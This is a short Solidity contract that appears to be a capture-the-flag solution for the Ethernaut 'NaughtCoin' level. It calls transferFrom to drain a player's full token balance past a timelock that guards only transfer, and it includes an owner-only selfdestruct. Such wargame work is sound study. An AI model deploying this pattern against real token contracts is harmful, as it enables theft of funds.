// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/token/ERC20/IERC20.sol';

contract NaughtCoinAttack {
    address payable public owner;
    IERC20 coin;

    modifier onlyOwner() {
        require(msg.sender == owner, "Sender is not owner");
        _;
    }

    constructor(address _target) public {
        owner = msg.sender;
        coin = IERC20(_target);        
    }

    function attack(address _player) public onlyOwner {
        coin.transferFrom(_player, address(this), coin.balanceOf(_player));
    }

    function destroy() public onlyOwner {
        selfdestruct(owner);
    }
}